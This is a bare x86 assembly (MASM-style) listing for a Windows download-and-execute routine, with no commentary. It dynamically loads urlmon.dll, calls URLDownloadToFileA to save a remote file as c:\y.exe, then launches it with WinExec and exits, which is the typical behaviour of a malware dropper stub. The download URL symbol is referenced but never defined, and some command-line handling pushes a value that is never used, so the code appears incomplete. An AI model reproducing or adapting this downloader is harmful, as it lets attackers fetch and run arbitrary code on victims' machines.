.data

szLibrary db "urlmon.dll",0
szFunction db "URLDownloadToFileA",0
szFileName db "c:\y.exe", 0

.data?
UrlDownloadToFile dword ?
.code
download proc
invoke GetCommandLineA

	add	ax,	0Ah
	lea	ecx,	[eax]
	push	ecx

	invoke LoadLibrary, addr szLibrary
	invoke GetProcAddress, eax, addr szFunction

mov UrlDownloadToFile, eax
push 0
push 0
push offset szFileName
push offset Url
push 0
call UrlDownloadToFile

invoke WinExec, addr szFileName, 1
invoke  ExitProcess, 0
download endp

